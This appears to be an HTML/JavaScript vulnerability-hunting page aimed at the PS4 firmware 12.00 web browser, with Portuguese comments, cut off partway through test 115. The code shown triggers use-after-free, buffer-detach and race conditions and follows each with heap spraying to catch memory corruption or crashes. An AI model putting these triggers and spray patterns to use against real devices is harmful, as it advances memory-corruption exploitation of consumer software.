<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PS4 FW 12.00 :: Hunter V22 (Silent Detection)</title>

</head>
<body>

    <h1>PS4 HUNTER V22 (SILENT ASSASSIN)</h1>
    <p>Targets: <i>OfflineAudio, WebSocket, NamedMap, Blob Nesting & CSS Font</i></p>

    <div class="btn-container">
        <button onclick="runTest104()">TEST 104: OfflineAudioContext Graph Mutation</button>
        <button onclick="runTest105()">TEST 105: WebSocket BinaryType Race</button>
        <button onclick="runTest106()">TEST 106: NamedNodeMap Attribute Cache</button>
        <button onclick="runTest107()">TEST 107: Deeply Nested Blob Read</button>
        <button onclick="runTest108()">TEST 108: FontFace SetClear Iterator</button>
        <button class="btn-crash" onclick="runTest109()">TEST 109: Recursive Iframe Unload Nuke</button>
        <button class="btn-crash" onclick="runTest110()">TEST 110: AnimationEnd Layout Thrash</button>
        <button class="btn-crash" onclick="runTest111()">TEST 111: TreeWalker OuterHTML Destruction</button>
        <button class="btn-silent" onclick="runTest112()">TEST 112: Blob Slice Revocation Leak</button>
        <button class="btn-silent" onclick="runTest113()">TEST 113: Float64 Array Buffer Detach Race</button>
        <button class="btn-silent" onclick="runTest114()">TEST 114: RegExp LastIndex Confusion</button>
<button class="btn-crash" onclick="runTest115()">TEST 115: GPU Bitmap Transfer Race (Kernel Panic)</button>
        <button class="btn-crash" onclick="runTest116()">TEST 116: Nested Worker ObjectURL Storm</button>
        <button class="btn-crash" onclick="runTest117()">TEST 117: FontFaceSet Recursive Clear</button>     
        <button class="btn-silent" onclick="runTest118()">TEST 118: TypedArray Setter Detach Trap</button>
        <button class="btn-silent" onclick="runTest119()">TEST 119: RegExp Sticky 'lastIndex' Overflow</button>
        <button class="btn-silent" onclick="runTest120()">TEST 120: JSON.parse Reviver Confusion</button>
        <button class="btn-crash" onclick="runTest121()">TEST 121: OffscreenCanvas Commit Race</button>
        <button class="btn-crash" onclick="runTest122()">TEST 122: ShadowDOM Slot Assignment Crash</button>
        <button class="btn-crash" onclick="runTest123()">TEST 123: AudioNode Channel Splitter UAF</button>        
        <button class="btn-silent" onclick="runTest124()">TEST 124: 0xFF Heap Feng Shui Leak</button>
        <button class="btn-silent" onclick="runTest125()">TEST 125: DataView Constructor Detach</button>
        <button class="btn-silent" onclick="runTest126()">TEST 126: Large String Flattening Leak</button>
        <button class="btn-crash" onclick="runTest127()">TEST 127: WebGL Texture Upload Race (GPU Panic)</button>
        <button class="btn-crash" onclick="runTest128()">TEST 128: Array.splice() Resize Trap (Heap Overflow)</button>
        <button class="btn-crash" onclick="runTest129()">TEST 129: CSS FontFace Garbage Collection Thrash</button>
        <button class="btn-silent" onclick="runTest130()">TEST 130: RegExp String Replacement OOB Read</button>
        <button class="btn-silent" onclick="runTest131()">TEST 131: Blob FileReader Revocation Leak</button>
        <button class="btn-silent" onclick="runTest132()">TEST 132: TypedArray Species Detach Leak</button>
        <button class="btn-crash" onclick="runTest133()">TEST 133: Array.from() Resize Trap</button>
        <button class="btn-crash" onclick="runTest134()">TEST 134: WebGL Renderbuffer Detach UAF</button>
        <button class="btn-crash" onclick="runTest135()">TEST 135: ResizeObserver Infinite Loop Crash</button>        
        <button class="btn-silent" onclick="runTest136()">TEST 136: String.localeCompare() Side-Effect</button>
        <button class="btn-silent" onclick="runTest137()">TEST 137: JSON.stringify() Buffer Detach</button>
        <button class="btn-silent" onclick="runTest138()">TEST 138: TextDecoder Stream Confusion</button>
        <button class="btn-crash" onclick="runTest139()">TEST 139: MessageChannel Entanglement Loop</button>
        <button class="btn-crash" onclick="runTest140()">TEST 140: ResizeObserver Depth-First Destruction</button>
        <button class="btn-crash" onclick="runTest141()">TEST 141: TreeWalker Filter Parent Nuke</button>      
        <button class="btn-silent" onclick="runTest142()">TEST 142: RegExp LastIndex Stale Read</button>
        <button class="btn-silent" onclick="runTest143()">TEST 143: Array.concat Species Confusion</button>
        <button class="btn-silent" onclick="runTest144()">TEST 144: Blob.text() Revocation Race</button>
        <button class="btn-crash" onclick="runTest145()">TEST 145: AudioNode Feedback Loop Destruction</button>
        <button class="btn-crash" onclick="runTest146()">TEST 146: Web Animation Finish Event UAF</button>
        <button class="btn-crash" onclick="runTest147()">TEST 147: Table Section Row Migration Crash</button>    
        <button class="btn-silent" onclick="runTest148()">TEST 148: Intl.Collator Stale Pointer</button>
        <button class="btn-silent" onclick="runTest149()">TEST 149: Array Concat Spreadable Trap</button>
        <button class="btn-silent" onclick="runTest150()">TEST 150: Promise.race Proxy Confusion</button>
        <button class="btn-crash" onclick="runTest151()">TEST 151: WebGL Shader Compiler Race</button>
        <button class="btn-crash" onclick="runTest152()">TEST 152: DOM insertBefore Reference Nuke</button>
        <button class="btn-crash" onclick="runTest153()">TEST 153: Canvas MeasureText Font Clear</button>      
        <button class="btn-silent" onclick="runTest154()">TEST 154: Sparse Array Reverse Hole Leak</button>
        <button class="btn-silent" onclick="runTest155()">TEST 155: URI Decode Buffer Overflow</button>
        <button class="btn-silent" onclick="runTest156()">TEST 156: DataView Endianness Confusion</button>
        <button class="btn-crash" onclick="runTest157()">TEST 157: RTCPeerConnection Signaling Race</button>
        <button class="btn-crash" onclick="runTest158()">TEST 158: SVG Marker Cyclic Reference</button>
        <button class="btn-crash" onclick="runTest159()">TEST 159: TextTrackCue List Mutation UAF</button>        
        <button class="btn-silent" onclick="runTest160()">TEST 160: TypedArray.set() Overlap Detach</button>
        <button class="btn-silent" onclick="runTest161()">TEST 161: Map Iterator Invalid Access</button>
        <button class="btn-silent" onclick="runTest162()">TEST 162: Proxy Revocable Handler Leak</button>
        <button class="btn-crash" onclick="runTest163()">TEST 163: WebGL Buffer Orphan Race</button>
        <button class="btn-crash" onclick="runTest164()">TEST 164: CSS Variable Recursive Explosion</button>
        <button class="btn-crash" onclick="runTest165()">TEST 165: ProcessingInstruction Node UAF</button>        
        <button class="btn-silent" onclick="runTest166()">TEST 166: Sparse Array Map Hole Leak</button>
        <button class="btn-silent" onclick="runTest167()">TEST 167: RegExp Named Group Offset Confusion</button>
        <button class="btn-silent" onclick="runTest168()">TEST 168: TypedArray Subarray Detach</button>
        <button class="btn-crash" onclick="runTest169()">TEST 169: Canvas putImageData Detach Race</button>
        <button class="btn-crash" onclick="runTest170()">TEST 170: CSS Keyframes Rule Mutation Crash</button>
        <button class="btn-crash" onclick="runTest171()">TEST 171: ShadowDOM Selection Collapse UAF</button>   
        <button class="btn-silent" onclick="runTest172()">TEST 172: Array.reduceRight() Resize Leak</button>
        <button class="btn-silent" onclick="runTest173()">TEST 173: RegExp Symbol.split Limit Confusion</button>
        <button class="btn-silent" onclick="runTest174()">TEST 174: Float32/64 DataView Aliasing Read</button>
        <button class="btn-crash" onclick="runTest175()">TEST 175: AudioParam Automation Race</button>
        <button class="btn-crash" onclick="runTest176()">TEST 176: CSS :has() Infinite Recursion</button>
        <button class="btn-crash" onclick="runTest177()">TEST 177: AdoptNode Iframe Cycle Crash</button>        
        <button class="btn-silent" onclick="runTest178()">TEST 178: Array.copyWithin() Resize Trap</button>
        <button class="btn-silent" onclick="runTest179()">TEST 179: Date.toJSON() Context Loss</button>
        <button class="btn-silent" onclick="runTest180()">TEST 180: URIError Stack Trace Leak</button>
        <button class="btn-crash" onclick="runTest181()">TEST 181: CSS calc() Stack Overflow</button>
        <button class="btn-crash" onclick="runTest182()">TEST 182: Recursive Event Listener Spiral</button>
        <button class="btn-crash" onclick="runTest183()">TEST 183: WebGL Context Loss Storm</button>
        <button class="btn-silent" onclick="runTest184()">TEST 184: Intl.NumberFormat State Leak</button>
        <button class="btn-silent" onclick="runTest185()">TEST 185: Canvas Winding Rule Confusion</button>
        <button class="btn-silent" onclick="runTest186()">TEST 186: BigInt64Array Typed Value Drift</button>
        <button class="btn-crash" onclick="runTest187()">TEST 187: Worker Transferable Double-Free</button>
        <button class="btn-crash" onclick="runTest188()">TEST 188: Intl.Segmenter Iterator Invalid Access</button>
        <button class="btn-crash" onclick="runTest189()">TEST 189: AudioWorklet Processor Destructor Race</button>  
        <button class="btn-silent" onclick="runTest190()">TEST 190: Array.flat() Side-Effect Length Leak</button>
        <button class="btn-silent" onclick="runTest191()">TEST 191: Map.set() Sealed Object Desync</button>
        <button class="btn-silent" onclick="runTest192()">TEST 192: Proxy.ownKeys() Invariant Violation</button>
        <button class="btn-crash" onclick="runTest187()">TEST 187: Worker Transferable Double-Free</button>
        <button class="btn-crash" onclick="runTest188()">TEST 188: Intl.Segmenter Iterator Invalid Access</button>
        <button class="btn-crash" onclick="runTest189()">TEST 189: AudioWorklet Processor Destructor Race</button>   
        <button class="btn-silent" onclick="runTest190()">TEST 190: Array.flat() Side-Effect Length Leak</button>
        <button class="btn-silent" onclick="runTest191()">TEST 191: Map.set() Sealed Object Desync</button>
        <button class="btn-silent" onclick="runTest192()">TEST 192: Proxy.ownKeys() Invariant Violation</button>
            <button class="cat-silent" onclick="runTest193()">TEST 193: Array.slice Species Trap</button>
            <button class="cat-silent" onclick="runTest194()">TEST 194: RegExp Sticky Side-Effect</button>
            <button class="cat-silent" onclick="runTest195()">TEST 195: Object.assign Proto Pollution Check</button>

            <button class="cat-crash" onclick="runTest196()">TEST 196: Range.deleteContents Mutation</button>
            <button class="cat-crash" onclick="runTest197()">TEST 197: WebAudio Convolver Re-set</button>
            <button class="cat-crash" onclick="runTest198()">TEST 198: Canvas Pattern Resize Nuke</button>
     
            <button class="cat-state" onclick="runTest199()">TEST 199: CustomElement Upgrade Re-entry</button>
            <button class="cat-state" onclick="runTest200()">TEST 200: Set Iteration Delete/Add Loop</button>
            <button class="cat-state" onclick="runTest201()">TEST 201: Detached Iframe Location Write</button>
     
            <button class="cat-race" onclick="runTest202()">TEST 202: MessagePort Transfer Closure</button>
            <button class="cat-race" onclick="runTest203()">TEST 203: Fetch AbortSignal Controller Race</button>
            <button class="cat-race" onclick="runTest204()">TEST 204: Worker Blob URL Revocation</button>
            <button onclick="runTest205()">TEST 205: String.replace Side-Effect</button>
            <button onclick="runTest206()">TEST 206: Array.concat Spreadable Lie</button>
            <button onclick="runTest207()">TEST 207: TypedArray.from Iterator Trap</button>
  
            <button onclick="runTest208()">TEST 208: XMLSerializer Getter Mutation</button>
            <button onclick="runTest209()">TEST 209: FontFace Load Event Detach</button>
            <button onclick="runTest210()">TEST 210: Selection.modify Range Collapse</button>
    
            <button onclick="runTest211()">TEST 211: Focus/Blur Zombie Element</button>
            <button onclick="runTest212()">TEST 212: History.pushState Limit Bypass</button>
            <button onclick="runTest213()">TEST 213: Iframe Sandbox Flag Confusion</button>
     
            <button onclick="runTest214()">TEST 214: ImageBitmap Closure Race</button>
            <button onclick="runTest215()">TEST 215: MessageChannel Post-Close Send</button>
            <button onclick="runTest216()">TEST 216: Blob Slice Worker Revoke</button>
           <button onclick="runTest217()">TEST 217: Object Shape Transition Confusion</button>
            <button onclick="runTest218()">TEST 218: Math.expm1 Precision Drift</button>
            <button onclick="runTest219()">TEST 219: Array.reverse Prototype Hole Leak</button>
   
            <button onclick="runTest220()">TEST 220: AudioNode Channel Interpretation UAF</button>
            <button onclick="runTest221()">TEST 221: WebGL TransformFeedback Double-Unbind</button>
            <button onclick="runTest222()">TEST 222: TextEncoder Stream Integer Overflow</button>
  
            
            <button onclick="runTest223()">TEST 223: WeakMap GC Resilience Desync</button>
            <button onclick="runTest224()">TEST 224: Nested CustomElement Adoption Loop</button>
            <button onclick="runTest225()">TEST 225: History State Cyclic Object Trap</button>
        
            
            <button onclick="runTest226()">TEST 226: BroadcastChannel Close/Post Race</button>
            <button onclick="runTest227()">TEST 227: Cache API Match/Delete Race</button>
            <button onclick="runTest228()">TEST 228: ResizeObserver/Fullscreen Toggle Storm</button>
            <button class="silent" onclick="runTest229()">TEST 229: BigInt64 Bitwise Reinterpretation</button>
            <button class="silent" onclick="runTest230()">TEST 230: Array.sort Comparator Resize Trap</button>
            <button class="silent" onclick="runTest231()">TEST 231: JSON.stringify Circular Proxy Leak</button>
    
            <button class="crash" onclick="runTest232()">TEST 232: Canvas SaveStack Recursion Nuke</button>
            <button class="crash" onclick="runTest233()">TEST 233: NodeIterator Detach Corruption</button>
            <button class="crash" onclick="runTest234()">TEST 234: WebGL Stride Buffer Overflow</button>
   
            <button class="state" onclick="runTest235()">TEST 235: Proxy Invariant Prototype Sabotage</button>
            <button class="state" onclick="runTest236()">TEST 236: Range Extraction DOM Mutation</button>
            <button class="state" onclick="runTest237()">TEST 237: Object.freeze ShadowDOM Bypass</button>
    
            <button class="race" onclick="runTest238()">TEST 238: WebSocket Event Queue Desync</button>
            <button class="race" onclick="runTest239()">TEST 239: IDBTransaction Commit/Abort Race</button>
            <button class="race" onclick="runTest240()">TEST 240: Blob URL Revoke vs XHR Read</button>
            <button class="s" onclick="run241()">TEST 241: RegExp Sticky LastIndex</button>
            <button class="s" onclick="run242()">TEST 242: Concat Spreadable Desync</button>
            <button class="s" onclick="run243()">TEST 243: Map Iterator Ghost</button>
      
            <button class="c" onclick="run244()">TEST 244: AudioParam Auto-Close</button>
            <button class="c" onclick="run245()">TEST 245: NodeIterator Detach</button>
            <button class="c" onclick="run246()">TEST 246: Selection Range Mutate</button>
    
            <button class="st" onclick="run247()">TEST 247: Proxy Keys Dupe</button>
            <button class="st" onclick="run248()">TEST 248: WeakRef Deref Logic</button>
            <button class="st" onclick="run249()">TEST 249: Object Seal Bypass</button>
 
            <button class="r" onclick="run250()">TEST 250: Cache Put/Delete</button>
            <button class="r" onclick="run251()">TEST 251: IDB Abort Commit</button>
            <button class="r" onclick="run252()">TEST 252: Worker Buffer Transfer</button>
<button class="s" onclick="t253()">TEST 253: RegExp LastIndex Mutation</button>
<button class="s" onclick="t254()">TEST 254: Array Reverse Prototype Trap</button>
<button class="s" onclick="t255()">TEST 255: Intl Collator Buffer Detach</button>

<button class="c" onclick="t256()">TEST 256: Table Section Row Swap</button>
<button class="c" onclick="t257()">TEST 257: AudioBuffer Loop Param Race</button>
<button class="c" onclick="t258()">TEST 258: SVG Use Shadow Tree Cycle</button>

<button class="st" onclick="t259()">TEST 259: Cross-Doc Range Adoption</button>
<button class="st" onclick="t260()">TEST 260: MessageEvent Source Confusion</button>
<button class="st" onclick="t261()">TEST 261: CustomElement Constructor Adopt</button>

<button class="r" onclick="t262()">TEST 262: WebSocket Blob Revoke Race</button>
<button class="r" onclick="t263()">TEST 263: OffscreenCanvas Transfer Draw</button>
<button class="r" onclick="t264()">TEST 264: IDB Index Cursor Delete</button>
<button class="s" onclick="t253()">TEST 253: RegExp LastIndex Mutation</button>
<button class="s" onclick="t254()">TEST 254: Array Reverse Prototype Trap</button>
<button class="s" onclick="t255()">TEST 255: Intl Collator Buffer Detach</button>

<button class="c" onclick="t256()">TEST 256: Table Section Row Swap</button>
<button class="c" onclick="t257()">TEST 257: AudioBuffer Loop Param Race</button>
<button class="c" onclick="t258()">TEST 258: SVG Use Shadow Tree Cycle</button>

<button class="st" onclick="t259()">TEST 259: Cross-Doc Range Adoption</button>
<button class="st" onclick="t260()">TEST 260: MessageEvent Source Confusion</button>
<button class="st" onclick="t261()">TEST 261: CustomElement Constructor Adopt</button>

<button class="r" onclick="t262()">TEST 262: WebSocket Blob Revoke Race</button>
<button class="r" onclick="t263()">TEST 263: OffscreenCanvas Transfer Draw</button>
<button class="r" onclick="t264()">TEST 264: IDB Index Cursor Delete</button>
<button style="border-color:#0aa" onclick="t265()">TEST 265: Array.indexOf Proxy Trap</button>
<button style="border-color:#aa0" onclick="t266()">TEST 266: Range Boundary Corruption</button>
<button style="border-color:#0aa" onclick="t267()">TEST 267: String.match Side-Effect</button>

<button style="border-color:#a00" onclick="t268()">TEST 268: FontFaceSet Iterator UAF</button>
<button style="border-color:#f80" onclick="t269()">TEST 269: MessagePort Transfer Race</button>
<button style="border-color:#a00" onclick="t270()">TEST 270: AudioNode Destructor Race</button>
    </div>

    <div id="log">Logs do sistema aparecer√£o aqui...</div>

    <script>
        function log(msg, type="info") {
            const l = document.getElementById('log');
            const color = type === "alert" ? "red" : "#00ff00";
            const prefix = type === "alert" ? "üö® [ALERTA CR√çTICO]: " : `[${new Date().toLocaleTimeString()}] `;
            
            l.innerHTML += `<span style="color:${color}">${prefix}${msg}</span><br>`;
            l.scrollTop = l.scrollHeight;
        }

        // Spray de Heap com padr√£o reconhec√≠vel para detec√ß√£o
        var sprayStore = [];
        function sprayHeap() {
            try {
                for(let i=0; i<2000; i++) {
                    let b = new Uint8Array(256);
                    b.fill(0x41); // 'A'
                    sprayStore.push(b);
                }
            } catch(e) {}
        }

        // --- TESTE 104: OfflineAudioContext Graph Mutation ---
        // Contextos offline renderizam √°udio o mais r√°pido poss√≠vel (n√£o em tempo real).
        // Se mutarmos o grafo de √°udio (conectar/desconectar n√≥s) durante o startRendering,
        // podemos causar confus√£o na thread de renderiza√ß√£o.
        function runTest104() {
            log("Iniciando Test 104: Audio Graph Mutation...");
            
            try {
                // Cria contexto offline (1 canal, 44100 frames, 44100Hz)
                let ctx = new (window.OfflineAudioContext || window.webkitOfflineAudioContext)(1, 44100, 44100);
                let osc = ctx.createOscillator();
                let gain = ctx.createGain();
                
                osc.connect(gain);
                gain.connect(ctx.destination);
                osc.start(0);
                
                // Inicia renderiza√ß√£o
                ctx.startRendering().then((buffer) => {
                    log("Renderiza√ß√£o conclu√≠da (Seguro).");
                }).catch((e) => log("Erro render: " + e));
                
                // NO MEIO da renderiza√ß√£o (Race Condition)
                // Tentamos desconectar e destruir os n√≥s
                setTimeout(() => {
                    log("Mutando grafo durante render...");
                    osc.disconnect();
                    gain.disconnect();
                    osc = null;
                    gain = null;
                    sprayHeap(); // Tenta ocupar a mem√≥ria dos n√≥s de √°udio
                }, 0);
                
            } catch(e) {
                log("Audio API n√£o suportada ou erro: " + e);
            }
        }

        // --- TESTE 105: WebSocket BinaryType Race ---
        // WebSockets podem receber dados como 'blob' ou 'arraybuffer'.
        // Mudar essa propriedade enquanto uma mensagem est√° chegando √© perigoso.
        function runTest105() {
            log("Iniciando Test 105: WebSocket Type Race...");
            
            // Conecta a um echo server p√∫blico (ou falha graciosamente)
            let ws = new WebSocket("wss://echo.websocket.org");
            
            ws.onopen = function() {
                log("WS Aberto. Enviando dados...");
                ws.send("Payload"); // Gatilho para receber resposta
                
                // Race: Muda o tipo bin√°rio repetidamente enquanto espera dados
                let interval = setInterval(() => {
                    ws.binaryType = (ws.binaryType === "blob") ? "arraybuffer" : "blob";
                }, 1);
                
                // Fecha abruptamente ap√≥s pouco tempo
                setTimeout(() => {
                    clearInterval(interval);
                    ws.close();
                    sprayHeap();
                }, 100);
            };
            
            ws.onmessage = function(e) {
                // Se recebermos uma mensagem DEPOIS de fechar ou mudar o tipo...
                // Verificamos se o tipo do dado bate com o binaryType atual
                log(`Msg recebida. Tipo Atual: ${ws.binaryType}, Dado: ${typeof e.data}`);
                
                if (ws.binaryType === "arraybuffer" && typeof e.data !== "object") {
                     log("ALERTA: Tipo de dado inconsistente recebido!", "alert");
                }
            };
            
            ws.onerror = function() { log("WS Erro (Provavelmente sem rede, mas o teste tentou)."); };
        }

        // --- TESTE 106: NamedNodeMap Attribute Cache ---
        // Elementos mant√™m um mapa de atributos (NamedNodeMap).
        // Se removermos um atributo via 'removeAttribute' e tentarmos acess√°-lo
        // via uma refer√™ncia salva do Map, podemos ler mem√≥ria morta?
        function runTest106() {
            log("Iniciando Test 106: Attribute Cache UAF...");
            
            let div = document.createElement('div');
            div.setAttribute("id", "target");
            div.setAttribute("class", "test");
            
            // Pega refer√™ncia direta ao objeto do atributo (Attr Node)
            let attrMap = div.attributes;
            let idAttr = attrMap.getNamedItem("id");
            
            log("Removendo atributo 'id'...");
            div.removeAttribute("id");
            
            sprayHeap(); // Ocupa mem√≥ria
            
            // Verifica√ß√£o Silenciosa
            try {
                // O objeto 'idAttr' deveria estar desconectado, mas v√°lido.
                // Por√©m, se o WebKit liberou a estrutura interna do Attr...
                let val = idAttr.value;
                let name = idAttr.name;
                
                if (val !== "target") {
                    log(`ALERTA: Valor do atributo corrompido! Lido: ${val}`, "alert");
                } else {
                    log("Atributo lido corretamente (Safe).");
                }
                
                // Tenta redefinir valor no atributo morto
                idAttr.value = "zombie";
                if (div.getAttribute("id") === "zombie") {
                     log("ALERTA: Atributo ressuscitou no elemento!", "alert");
                }
            } catch(e) {
                log("Erro: " + e);
            }
        }

        // --- TESTE 107: Deeply Nested Blob Read ---
        // Blobs aninhados (Blob dentro de Blob) criam cadeias de refer√™ncia.
        // Se a cadeia for muito profunda e revogarmos a raiz, a leitura da ponta falha?
        function runTest107() {
            log("Iniciando Test 107: Nested Blob Chain...");
            
            let layers = 50;
            let blob = new Blob(["ROOT"]);
            
            // Cria matrioska de blobs
            for(let i=0; i<layers; i++) {
                blob = new Blob([blob]);
            }
            
            let url = URL.createObjectURL(blob);
            
            // L√™ via XHR
            let xhr = new XMLHttpRequest();
            xhr.open("GET", url, true);
            xhr.responseType = "text";
            
            xhr.onload = function() {
                // Verifica√ß√£o de Integridade
                if (xhr.response === "ROOT") {
                    log("Leitura √≠ntegra.");
                } else {
                    log(`ALERTA: Conte√∫do corrompido! Esperado 'ROOT', veio: ${xhr.response.substring(0, 10)}...`, "alert");
                }
            };
            
            xhr.send();
            
            // Destroi a refer√™ncia JS imediatamente
            log("Destruindo refer√™ncias de Blob...");
            blob = null;
            URL.revokeObjectURL(url);
            sprayHeap();
        }

        // --- TESTE 108: FontFace SetClear Iterator ---
        // Variante do teste de fonte, mas com verifica√ß√£o de ponteiro.
        // Adicionamos fontes, iteramos, limpamos e verificamos se o iterador retorna lixo.
        function runTest108() {
            log("Iniciando Test 108: Font Iterator Check...");
            
            let f = new FontFace("Test", "url(x)");
            document.fonts.add(f);
            
            let iter = document.fonts.values();
            iter.next(); // Avan√ßa 1
            
            log("Limpando fontes...");
            document.fonts.clear();
            sprayHeap();
            
            try {
                // O iterador deve estar inv√°lido ou "done".
                let res = iter.next();
                
                if (!res.done && res.value) {
                    // Se retornou um valor DEPOIS do clear, esse valor √© v√°lido?
                    // Tenta acessar propriedades do objeto retornado
                    let status = res.value.status; 
                    log(`ALERTA: Iterador retornou objeto fantasma! Status: ${status}`, "alert");
                } else {
                    log("Iterador finalizou corretamente.");
                }
            } catch(e) {
                log("Erro esperado: " + e.message);
            }
        }
 // ==========================================
        // GRUPO 1: CRASH VECTORS (Loud)
        // ==========================================

        // --- TESTE 109: Recursive Iframe Unload Nuke ---
        // L√≥gica: Ao descarregar um iframe, disparamos eventos. Se nesse evento
        // destruirmos o documento pai ou manipularmos o DOM de forma recursiva,
        // o FrameLoader perde o ch√£o.
        function runTest109() {
            log("Iniciando Test 109: Iframe Nuke...");
            
            let f = document.createElement('iframe');
            document.body.appendChild(f);
            
            f.contentWindow.onunload = function() {
                log("Iframe unloading... Destruindo MUNDO!");
                // Nuke no body principal durante o processo de limpeza do filho
                document.body.innerHTML = "<b>CRASHED?</b>"; 
                sprayHeap();
                
                // Tenta criar novos elementos no documento moribundo
                try {
                    document.createElement('img');
                } catch(e) {}
            };
            
            log("Removendo iframe...");
            f.remove();
        }

        // --- TESTE 110: AnimationEnd Layout Thrash ---
        // L√≥gica: Usar o evento 'webkitAnimationEnd'. O navegador dispara isso
        // ap√≥s calcular anima√ß√µes. Se destruirmos o elemento animado e for√ßarmos
        // um Rec√°lculo de Estilo IMEDIATAMENTE no handler, pegamos a engine suja.
        function runTest110() {
            log("Iniciando Test 110: Animation Layout...");
            
            let style = document.createElement('style');
            style.textContent = `
                @keyframes k { from { opacity: 0; } to { opacity: 1; } }
                .anim { animation: k 0.01s; }
            `;
            document.head.appendChild(style);
            
            let div = document.createElement('div');
            div.className = "anim";
            div.innerText = "X";
            document.body.appendChild(div);
            
            div.addEventListener('webkitAnimationEnd', function() {
                log("Anima√ß√£o acabou. Thrashing...");
                
                // Remove o elemento
                div.remove();
                sprayHeap();
                
                // Acesso perigoso: Tenta ler estilo computado de elemento que acabou de morrer
                // e que estava sendo processado pela thread de anima√ß√£o
                try {
                    let w = getComputedStyle(div).width;
                    log("Largura lida: " + w);
                } catch(e) {}
                
                // Tenta acessar propriedades de anima√ß√£o
                div.style.animationName = "none";
            });
        }

        // --- TESTE 111: TreeWalker OuterHTML Destruction ---
        // L√≥gica: 'outerHTML' substitui o elemento por outro.
        // Se fizermos isso enquanto um TreeWalker est√° "sentado" no elemento,
        // o ponteiro 'currentNode' do Walker se torna inv√°lido?
        function runTest111() {
            log("Iniciando Test 111: TreeWalker OuterHTML...");
            
            let root = document.createElement('div');
            let child = document.createElement('div');
            root.appendChild(child);
            document.body.appendChild(root);
            
            let tw = document.createTreeWalker(root, NodeFilter.SHOW_ELEMENT);
            tw.nextNode(); // Move para child
            
            log("Walker em 'child'. Executando outerHTML...");
            
            // Substitui 'child' por um span, destruindo o objeto original
            child.outerHTML = "<span>Substituted</span>";
            child = null; // Solta refer√™ncia JS
            
            sprayHeap();
            
            try {
                // Onde est√° o Walker? Ele aponta para o n√≥ destru√≠do.
                log("Tentando mover Walker...");
                tw.parentNode(); // Tenta subir
                log("Walker TagName: " + tw.currentNode.tagName);
            } catch(e) {
                log("Erro: " + e.message);
            }
        }

        // ==========================================
        // GRUPO 2: SILENT VECTORS (Integrity Check)
        // ==========================================

        // --- TESTE 112: Blob Slice Revocation Leak ---
        // L√≥gica: Criamos um Blob, fatiamos (slice), criamos URL, lemos.
        // Revogamos a URL do PAI enquanto lemos o FILHO.
        // Verificamos se os dados lidos s√£o 'A' (0x41) ou lixo.
        function runTest112() {
            log("Iniciando Test 112: Blob Integrity...");
            
            let data = new Uint8Array(1024 * 1024); // 1MB
            data.fill(0x41); // Preenche com 'A'
            
            let parentBlob = new Blob([data]);
            let slicedBlob = parentBlob.slice(0, 1024); // Fatia
            
            let url = URL.createObjectURL(slicedBlob);
            
            let xhr = new XMLHttpRequest();
            xhr.open("GET", url, true);
            xhr.responseType = "arraybuffer";
            
            xhr.onload = function() {
                if (xhr.status === 200) {
                    let res = new Uint8Array(xhr.response);
                    // Verifica√ß√£o: O primeiro byte √© 'A'?
                    if (res.length > 0 && res[0] === 0x41) {
                        log("Blob lido corretamente (Sem corrup√ß√£o).", "success");
                    } else {
                        log(`DADOS CORROMPIDOS! Lido: 0x${res[0].toString(16)}`, "alert");
                    }
                }
            };
            
            xhr.send();
            
            // Destrui√ß√£o imediata
            log("Revogando URL e Blob...");
            URL.revokeObjectURL(url);
            parentBlob = null;
            slicedBlob = null;
            data = null;
            sprayHeap();
        }

        // --- TESTE 113: Float64 Array Buffer Detach Race ---
        // L√≥gica: Tentamos "desconectar" (neutrar) um buffer enquanto o construtor
        // de TypedArray est√° lendo dele.
        function runTest113() {
            log("Iniciando Test 113: Buffer Detach...");
            
            let ab = new ArrayBuffer(1024);
            // Preenche com padr√£o seguro
            new Uint8Array(ab).fill(0x55);
            
            let safe = true;
            
            // Objeto malicioso para indexa√ß√£o
            let idx = {
                valueOf: function() {
                    log("Index acessado! Detachando buffer...");
                    // Transfere o buffer para worker (esvazia o original)
                    try {
                        let w = new Worker(URL.createObjectURL(new Blob([""],{type:'text/javascript'})));
                        w.postMessage(ab, [ab]);
                        w.terminate();
                    } catch(e) {}
                    
                    sprayHeap();
                    return 0;
                }
            };
            
            try {
                // Tenta criar um Float64Array a partir do buffer
                // O WebKit l√™ o buffer -> chama valueOf do offset -> n√≥s matamos o buffer
                let view = new Float64Array(ab, idx, 10);
                
                // Se o buffer foi detachado, length deve ser 0
                if (view.length === 0) {
                    log("Buffer detachado corretamente (Safe).", "success");
                } else {
                    // Se length > 0 mas buffer est√° vazio, estamos apontando para lixo
                    // Tenta ler
                    let val = view[0];
                    if (Number.isNaN(val) || val === 0) {
                        // Pode ser 0 se o spray falhou, ou lixo.
                        log("View sobreviveu ao detach! Valor: " + val, "alert");
                    }
                }
            } catch(e) {
                log("Erro esperado: " + e.message, "success");
            }
        }

        // --- TESTE 114: RegExp LastIndex Confusion ---
        // L√≥gica: RegExp com flag 'y' (sticky) usa 'lastIndex'.
        // Definimos 'lastIndex' como um objeto com getter.
        // O getter altera a string sendo processada.
        function runTest114() {
            log("Iniciando Test 114: RegExp Logic...");
            
            let re = /A/y;
            let str = "AAAAAA";
            
            let confused = false;
            
            re.lastIndex = {
                valueOf: function() {
                    log("RegExp leu lastIndex. Mudando string...");
                    str = "BBBBBB"; // Muda a string subjacente? (Strings s√£o imut√°veis, mas a var muda)
                    sprayHeap();
                    return 0;
                }
            };
            
            // Executa regex
            let res = re.exec(str);
            
            // Verifica
            if (res && res[0] === 'A') {
                log("RegExp normal.", "success");
            } else if (res && res[0] === 'B') {
                log("RegExp leu string nova (Safe).", "success");
            } else {
                // Se der null ou comportamento estranho
                log("Resultado RegExp: " + res, "info");
            }
        }
 // ==========================================
        // GRUPO 1: CRASH VECTORS (TENTATIVA DE DERRUBAR)
        // ==========================================

        // --- TESTE 115: GPU Bitmap Transfer Race ---
        // Alvo: Comunica√ß√£o WebProcess <-> GPU Process.
        // Tentamos transferir um Bitmap para um Worker e fech√°-lo imediatamente.
        // Se a GPU tentar acessar a textura depois que o Worker morreu, boom.
        function runTest115() {
            log("Iniciando Test 115: GPU Race...");
            
            let canvas = document.createElement('canvas');
            let ctx = canvas.getContext('2d');
            ctx.fillStyle = 'red'; 
            ctx.fillRect(0,0,1024,1024); // Textura pesada

            // Cria Bitmap
            createImageBitmap(canvas).then(bmp => {
                log("Bitmap criado. Iniciando Race...");
                
                // Spamma workers que recebem o bitmap e morrem
                for(let i=0; i<5; i++) {
                    let w = new Worker(URL.createObjectURL(new Blob([
                        "self.onmessage = function(e) { e.data.close(); self.close(); }"
